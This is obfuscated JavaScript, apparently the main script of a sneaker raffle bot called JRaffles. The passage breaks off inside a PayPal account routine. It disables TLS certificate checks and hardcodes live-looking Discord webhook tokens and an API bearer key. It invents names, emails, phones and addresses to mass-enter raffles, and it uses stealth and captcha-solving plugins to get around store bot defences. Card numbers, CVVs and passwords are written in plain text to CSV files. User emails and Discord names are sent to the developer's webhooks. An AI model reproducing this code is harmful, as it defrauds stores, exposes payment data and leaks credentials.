process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x144018 = require('fs'), _0x3b5983 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x24af3e(_0x149c75) {
    const _0x25cda6 = _0x144018['createWriteStream'](_0x149c75, { 'flags': 'a' }), _0x522d85 = console['log'];
    console['log'] = function () {
        const _0x2bd8a2 = Array['prototype']['slice']['call'](arguments), _0x17d332 = _0x2bd8a2['join']('\x20') + '\x0a';
        _0x25cda6['write'](_0x17d332), _0x522d85['apply'](console, _0x2bd8a2);
    };
}
_0x24af3e('../logs/log\x20' + _0x3b5983);
var _0x3ce32f = require('tough-cookie'), _0x2b7859 = require('node-imap'), _0x50af30 = require('util')['inspect'];
const _0x186dbf = require('mailparser')['simpleParser'], { EmbedBuilder: _0x4177e6 } = require('discord.js');
var _0x13a591 = require('exe');
const { execFile: _0x49d5e9 } = require('child_process'), _0x3ad8ba = require('puppeteer-extra'), _0x541303 = require('puppeteer-extra-plugin-recaptcha'), _0x36d6c8 = require('puppeteer-extra-plugin-stealth'), _0xe8dd24 = require('chalk'), _0x3a603f = require('node-bash-title'), _0x469c71 = require('axios'), _0x4cc58a = require('papaparse');
var _0x1452ea = require('random-name');
const _0x11f0d1 = require('request');
var _0x30e3d7 = require('prompt');
const _0x500704 = _0x11f0d1['jar']();
var _0x4a0109 = {};
const _0x565270 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x5e2dd0 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x55c678 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x121ce3 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x393cd3 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x509529 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x3bc55a = 'https://discord.com/api/webhooks/', _0x4ca028 = '' + _0x3bc55a + _0x55c678, _0x2467e3 = '' + _0x3bc55a + _0x121ce3, _0x6ed44c = '' + _0x3bc55a + _0x565270, _0x11ee4c = '' + _0x3bc55a + _0x5e2dd0, _0x17a127 = '' + _0x3bc55a + _0x393cd3, _0x194c59 = '' + _0x3bc55a + _0x509529;
const _0x30168f = JSON['parse'](_0x144018['readFileSync']('../package.json', 'utf-8')), _0x5192c8 = _0x30168f['version'];
var _0x140e27, _0x6deda4, _0x5c099c, _0x4c023a, _0x5d9420, _0x19ecf5, _0x4f2583, _0x5f1dcb;
const _0x519a9c = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x3fba11 = ![];
const _0x4231a9 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x1b22d9 = '0123456789';
var _0x5f32a7 = _0x4231a9['split']('');
const _0x4947eb = require('auto-git-update'), _0x520cc6 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x32c20c = new _0x4947eb(_0x520cc6);
async function _0xa914ce() {
    _0x5d9420 = _0x144018['readdirSync']('../proxies'), _0x4c023a = _0x144018['readdirSync']('../tasks'), !_0x144018['existsSync']('../accounts/fenom.csv') && _0x144018['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x144018['existsSync']('../accounts/paypal.csv') && _0x144018['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x144018['existsSync']('../accounts/bstn.csv') && _0x144018['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x144018['existsSync']('../accounts/eql.csv') && _0x144018['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x144018['existsSync']('../failed-tasks.csv') && _0x144018['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x144018['existsSync']('../successful-tasks.csv') && _0x144018['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x4a0109 = JSON['parse'](_0x144018['readFileSync']('../settings.json', 'utf-8')), !_0x4a0109['delay'] && (_0x4a0109['delay'] = 0x3c, _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109, null, 0x2))), !_0x4a0109['masterMail'] && (_0x4a0109['masterMail'] = 'yourmail@gmail.com', _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109, null, 0x2))), !_0x4a0109['masterPassword'] && (_0x4a0109['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109, null, 0x2))), !_0x4a0109['captchaKey'] && (_0x4a0109['captchaKey'] = '', _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109, null, 0x2))), !_0x4a0109['useRandomProxy'] && (_0x4a0109['useRandomProxy'] = !![], _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109, null, 0x2))), !_0x4a0109['shuffleTasks'] && (_0x4a0109['shuffleTasks'] = ![], _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109, null, 0x2))), !_0x4a0109['webhook'] && (_0x4a0109['webhook'] = '', _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109, null, 0x2))), _0x4a0109['delay'] <= 0x1388 && (_0x4a0109['delay'] = _0x4a0109['delay'] * 0x3e8), _0x4a0109['AfewDelay'] && (delete _0x4a0109['AfewDelay'], _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109, null, 0x2))), _0x4a0109['MahaDelay'] && (delete _0x4a0109['MahaDelay'], _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109, null, 0x2))), _0x4a0109['footshopDelay'] && (delete _0x4a0109['footshopDelay'], _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109, null, 0x2))), _0x4a0109['MahaDelay'] = _0x4a0109['delay'], _0x3bc55a = _0x4a0109['webhook'], _0x19ecf5 = _0x4a0109['licenseKey'];
}
let _0x2fb755, _0x3cbb71 = [], _0x27ddc3;
const _0x41ff52 = _0x5c847d => new Promise(_0x6f1d75 => setTimeout(_0x6f1d75, _0x5c847d));
function _0x2baaff(_0x342da7, _0x13c0ac) {
    return Math['floor'](Math['random']() * (_0x13c0ac - _0x342da7 + 0x1) + _0x342da7);
}
function _0x5c6b16(_0x57ae2c) {
    let _0x4c9fbb = _0x57ae2c['length'], _0x4f3645;
    while (_0x4c9fbb != 0x0) {
        _0x4f3645 = Math['floor'](Math['random']() * _0x4c9fbb), _0x4c9fbb--, [_0x57ae2c[_0x4c9fbb], _0x57ae2c[_0x4f3645]] = [
            _0x57ae2c[_0x4f3645],
            _0x57ae2c[_0x4c9fbb]
        ];
    }
    return _0x57ae2c;
}
async function _0x120c66(_0x3951a0) {
    return _0x469c71['get']('https://api.hyper.co/v4/licenses/' + _0x3951a0, { 'headers': { 'Authorization': 'Bearer\x20' + _0x519a9c } })['then'](_0x5c1547 => _0x5c1547['data'])['catch'](() => null);
}
;
async function _0x5b5b05(_0x2d7898) {
    console['clear']();
    if (_0x2d7898 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x96cd45 = await _0x30e3d7['get']('License');
        if (_0x96cd45['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x41ff52(0xbb8), _0x5b5b05(_0x2d7898);
        _0x2d7898 = _0x96cd45['License'], _0x4a0109['licenseKey'] = _0x2d7898, _0x19ecf5 = _0x2d7898, _0x144018['writeFileSync']('../settings.json', JSON['stringify'](_0x4a0109));
    }
    console['log']('Checking\x20license\x20' + _0x19ecf5 + '...'), await _0x41ff52(0x320);
    const _0x33d1c9 = await _0x120c66(_0x2d7898);
    _0x4f2583 = JSON['stringify'](_0x33d1c9['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x5f1dcb = JSON['stringify'](_0x33d1c9['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x33d1c9)
        return console['log']('License\x20not\x20found');
    if (!_0x33d1c9['user'])
        return console['log']('License\x20not\x20bound');
    return _0x33d1c9['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x3fba11 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x3fba11 = ![]);
}
async function _0x367a34() {
    var _0x18f58d = await _0x30e3d7['get']('Module');
    return console['clear'](), _0x18f58d['Module'];
}
;
async function _0x383911() {
    var _0x294788 = await _0x30e3d7['get']('Setting');
    return console['clear'](), _0x294788['Setting'];
}
async function _0x52e684(_0x12e8e9) {
    var _0x181d20 = [];
    for (file of _0x4c023a) {
        var _0x26786d = _0x144018['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x4cc58a['parse'](_0x26786d, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x12e8e9['store'] && _0x181d20['push'](file);
    }
    !_0x181d20['length'] == 0x0 && (_0x4c023a = _0x181d20);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x590f58 = 0x0; _0x590f58 < _0x4c023a['length']; _0x590f58++) {
        console['log']('\x20(' + _0x590f58 + ')\x20' + _0x4c023a[_0x590f58]);
    }
    console['log']('');
    var _0x4aa6c1 = await _0x30e3d7['get']('Task');
    if (_0x4aa6c1['Task'] > _0x4c023a['length'] - 0x1 || isNaN(_0x4aa6c1['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x41ff52(0x3e8), _0x52e684();
    var _0x22cbd7 = _0x144018['readFileSync']('../tasks/' + _0x4c023a[_0x4aa6c1['Task']], 'utf-8');
    return _0x5c099c = _0x4cc58a['parse'](_0x22cbd7, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0xe8dd24['blue'](_0x4c023a[_0x4aa6c1['Task']])), _0x140e27 = _0x4c023a[_0x4aa6c1['Task']], _0x5c099c;
}
async function _0x47bed4() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x1dae22 = 0x0; _0x1dae22 < _0x5d9420['length']; _0x1dae22++) {
        console['log']('\x20(' + _0x1dae22 + ')\x20' + _0x5d9420[_0x1dae22]);
    }
    console['log']('');
    var _0x38d931 = await _0x30e3d7['get']('Proxies');
    if (_0x38d931['Proxies'] > _0x5d9420['length'] - 0x1 || isNaN(_0x38d931['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x41ff52(0x3e8), _0x47bed4();
    var _0x46eec7 = _0x144018['readFileSync']('../proxies/' + _0x5d9420[_0x38d931['Proxies']], 'utf-8')['split']('\x0a');
    let _0xae9d57 = _0x46eec7['map']((_0x443a2d, _0x4c97a8) => {
        sanatizeProxy = _0x443a2d['replace']('\x0d', '');
        if (_0x46eec7[_0x4c97a8 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x6deda4 = _0x5d9420[_0x38d931['Proxies']], console['clear'](), _0xae9d57;
}
async function _0x4409c3() {
    var _0x37ad5d = await _0x30e3d7['get']('Value');
    return console['clear'](), _0x37ad5d['Value'];
}
async function _0x347657(_0x20a33c) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x397498 = 0x0; _0x397498 < _0x20a33c['length']; _0x397498++) {
        console['log']('\x20(' + _0x397498 + ')\x20[' + _0x20a33c[_0x397498]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x5b24ab = await _0x30e3d7['get']('Module');
    return _0x5b24ab['Module'];
}
async function _0x12d1c1() {
    var _0x154664 = await _0x30e3d7['get']('Password');
    return console['clear'](), _0x154664['Password'];
}
;
async function _0x4b325f() {
    var _0xcde73d = await _0x30e3d7['get']('Links');
    return _0xcde73d['Links'];
}
;
async function _0x444f67() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x350071 = 0x0; _0x350071 < _0x3cbb71['length']; _0x350071++) {
        console['log']('\x20(' + _0x350071 + ')\x20' + _0x3cbb71[_0x350071]);
    }
    ;
    console['log']();
    let _0x35b5 = await _0x30e3d7['get']('Product');
    return console['clear'](), _0x35b5['Product'];
}
;
function _0x2fd7e7() {
    var _0x2378f3 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x2378f3;
}
;
function _0x1f3d32() {
    var _0x308a1d = new Date(Date['now']())['toLocaleString']();
    return _0x308a1d['replace'](',', '');
}
async function _0x161ab9(_0x205209, _0x223f35) {
    let _0x3e2a0 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x5192c8 != 'devkey') {
        await _0x469c71['post'](_0x205209, _0x223f35, _0x3e2a0);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x17c0a2(_0x4122e5, _0x135ebf, _0xb8c283, _0x4924a4, _0x2a497c) {
    if (!_0x4924a4 && _0xb8c283 == 'dev') {
        var _0x3240ac = new _0x4177e6()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x135ebf['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x135ebf['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x4122e5['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x4a0109['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x4f2583,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x4122e5['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x4122e5['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x5192c8,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x3240ac['data'];
    } else {
        if (_0x4924a4 && _0xb8c283 == 'dev') {
            var _0x3240ac = new _0x4177e6()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x135ebf['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x4f2583,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x135ebf['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x4122e5['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x4a0109['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x2a497c,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x4122e5['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x4122e5['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x5192c8,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x3240ac['data'];
        } else {
            if (_0xb8c283 == 'pub') {
                var _0x3240ac = new _0x4177e6()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x135ebf['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x135ebf['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x4122e5['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x4a0109['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x4122e5['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x5192c8,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x3240ac['data'];
            } else {
                if (_0xb8c283 == 'acc' && !_0x4924a4) {
                    var _0x3240ac = new _0x4177e6()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x135ebf['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x4f2583,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x135ebf['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x4a0109['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x5192c8,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x3240ac['data'];
                } else {
                    if (_0xb8c283 == 'acc' && _0x4924a4) {
                        var _0x3240ac = new _0x4177e6()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x135ebf['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x4f2583,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x2a497c,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x135ebf['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x4a0109['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x5192c8,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x3240ac['data'];
                    } else {
                        if (_0xb8c283 == 'open') {
                            var _0x3240ac = new _0x4177e6()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x5f1dcb)['addFields']({
                                'name': 'User',
                                'value': '' + _0x4f2583,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x5192c8,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x3240ac['data'];
                        } else {
                            if (!_0x4924a4 && _0xb8c283 == 'ver') {
                                var _0x3240ac = new _0x4177e6()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x135ebf['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x4f2583,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x135ebf['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x4a0109['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x5192c8,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x3240ac['data'];
                            } else {
                                if (_0x4924a4 && _0xb8c283 == 'ver') {
                                    var _0x3240ac = new _0x4177e6()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x135ebf['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x4f2583,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x2a497c,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x135ebf['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x4a0109['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x5192c8,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x3240ac['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x547a29(_0x35086d, _0x639542) {
    var _0xe9207b = _0x35086d[_0x639542]['Address1']['split'](''), _0x9f825c = _0x35086d[_0x639542]['Address2']['split'](''), _0x50790a = _0x35086d[_0x639542]['Email']['split']('@');
    for (var _0x184358 = 0x0; _0x184358 < _0xe9207b['length']; _0x184358++) {
        if (_0xe9207b[_0x184358] == 'X') {
            var _0x21a27f = Math['round'](Math['random']() * (_0x4231a9['length'] - 0x1));
            _0xe9207b[_0x184358] = _0x5f32a7[_0x21a27f];
        }
    }
    ;
    for (var _0x184358 = 0x0; _0x184358 < _0x9f825c['length']; _0x184358++) {
        if (_0x9f825c[_0x184358] == 'X') {
            var _0x21a27f = Math['round'](Math['random']() * (_0x4231a9['length'] - 0x1));
            _0x9f825c[_0x184358] = _0x5f32a7[_0x21a27f];
        }
    }
    ;
    _0x35086d[_0x639542]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x35086d[_0x639542]['FirstName'] = _0x1452ea['first']());
    _0x35086d[_0x639542]['LastName']['toUpperCase']() == 'RANDOM' && (_0x35086d[_0x639542]['LastName'] = _0x1452ea['last']());
    _0x50790a[0x0]['toUpperCase']() == 'RANDOM' ? _0x50790a[0x0] = '' + _0x1452ea['first']() + _0x1452ea['last']() + _0x2baaff(0x1, 0x270f) + '@' : _0x50790a[0x0] = _0x50790a[0x0] + '@';
    _0x35086d[_0x639542]['Email'] = _0x50790a['join'](''), _0x35086d[_0x639542]['Address1'] = _0xe9207b['join'](''), _0x35086d[_0x639542]['Address2'] = _0x9f825c['join']('');
    _0x35086d[_0x639542]['Phone'] == 'RANDOM' && (_0x35086d[_0x639542]['Phone'] = '0' + _0x2baaff(0x5f5e100, 0x3b9ac9ff));
    if (_0x35086d[_0x639542]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x303e22 = _0x2baaff(0x1, 0x270f);
        _0x35086d[_0x639542]['Follower'] = '' + _0x1452ea['first']() + _0x1452ea['last']() + _0x303e22 + '\x20';
    }
    _0x35086d[_0x639542]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x35086d[_0x639542]['HouseNumber'] = _0x2baaff(0x1, 0xc8));
    if (_0x35086d[_0x639542]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x54527f = Math['round'](Math['random']() * (_0x4231a9['length'] - 0x1)), _0x1a701c = _0x5f32a7[_0x54527f];
        _0x35086d[_0x639542]['Address1'] = _0x1452ea['last']() + 'straat', _0x35086d[_0x639542]['Zip'] == '' && (_0x35086d[_0x639542]['Postcode'] = _0x2baaff(0x3e8, 0x270f) + '\x20' + _0x1a701c + _0x1a701c, _0x35086d[_0x639542]['Zip'] = _0x35086d[_0x639542]['Postcode']), _0x35086d[_0x639542]['HouseNumber'] = '' + _0x2baaff(0x1, 0xc8);
    }
    return;
}
;
async function _0x53e25e(_0xe91cd9, _0x5532be) {
    _0x144018['appendFileSync']('../failed-tasks.csv', _0x1f3d32() + ',' + _0x5532be['store'] + ',' + _0x5532be['name'] + ',' + _0xe91cd9['Url'] + ',' + _0xe91cd9['Size'] + ',' + _0xe91cd9['Follower'] + ',' + _0xe91cd9['FirstName'] + ',' + _0xe91cd9['LastName'] + ',' + _0xe91cd9['Address1'] + ',' + _0xe91cd9['Address2'] + ',' + _0xe91cd9['HouseNumber'] + ',' + _0xe91cd9['Zip'] + ',' + _0xe91cd9['City'] + ',' + _0xe91cd9['State'] + ',' + _0xe91cd9['Country'] + ',' + _0xe91cd9['Phone'] + ',' + _0xe91cd9['Email'] + ',' + _0xe91cd9['Password'] + ',' + _0xe91cd9['PaymentMethod'] + ',' + _0xe91cd9['CardType'] + ',' + _0xe91cd9['NameOnCard'] + ',' + _0xe91cd9['CardNumber'] + ',' + _0xe91cd9['ExpiryDate'] + ',' + _0xe91cd9['CVV'] + ',' + _0xe91cd9['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0xe72aef(_0x171918, _0x76c183) {
    _0x144018['appendFileSync']('../successful-tasks.csv', _0x1f3d32() + ',' + _0x76c183['store'] + ',' + _0x76c183['name'] + ',' + _0x171918['Url'] + ',' + _0x171918['Size'] + ',' + _0x171918['Follower'] + ',' + _0x171918['FirstName'] + ',' + _0x171918['LastName'] + ',' + _0x171918['Address1'] + ',' + _0x171918['Address2'] + ',' + _0x171918['HouseNumber'] + ',' + _0x171918['Zip'] + ',' + _0x171918['City'] + ',' + _0x171918['State'] + ',' + _0x171918['Country'] + ',' + _0x171918['Phone'] + ',' + _0x171918['Email'] + ',' + _0x171918['Password'] + ',' + _0x171918['PaymentMethod'] + ',' + _0x171918['CardType'] + ',' + _0x171918['NameOnCard'] + ',' + _0x171918['CardNumber'] + ',' + _0x171918['ExpiryDate'] + ',' + _0x171918['CVV'] + ',' + _0x171918['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x3e518f() {
    let _0x2eb406 = proxyFile['split']('\x0a'), _0xf49ca8 = _0x2eb406['map']((_0x2dc05f, _0x5574d5) => {
        sanatizeProxy = _0x2dc05f['replace']('\x0d', '');
        if (_0x2eb406[_0x5574d5 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0xf49ca8;
}
;
async function _0x3c7a12(_0x29aa09, _0x2fd9e9) {
    if (_0x57ac78 != 'yes')
        var _0x57ac78 = '', _0xbd1f66 = 0x0;
    async function _0xe0dac0() {
        var _0x22f7d2 = _0x144018['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x57b350 = _0x4cc58a['parse'](_0x22f7d2, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x12f0a8 = 0x0; _0x12f0a8 < _0x57b350['length']; _0x12f0a8++) {
            console['log']('(' + _0x12f0a8 + ')\x20' + _0x57b350[_0x12f0a8]['Email']);
        }
        console['log']('\x0a(' + _0x57b350['length'] + ')\x20' + _0xe8dd24['cyan']('Add\x20a\x20new\x20account'));
        let _0x4a4671 = await _0x30e3d7['get']('Option');
        if (_0x4a4671['Option'] < _0x57b350['length'])
            return _0x57b350[_0x4a4671['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x3b04e9 = {}, _0x22cd10 = await _0x30e3d7['get']('Email');
        _0x3b04e9['Email'] = _0x22cd10['Email'];
        var _0x13ac8c = Math['round'](Math['random']() * (_0x2fd9e9['length'] - 0x1));
        _0x3b04e9['Proxy'] = _0x2fd9e9[_0x13ac8c], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x3a7cd7 = await _0x30e3d7['get']('Password');
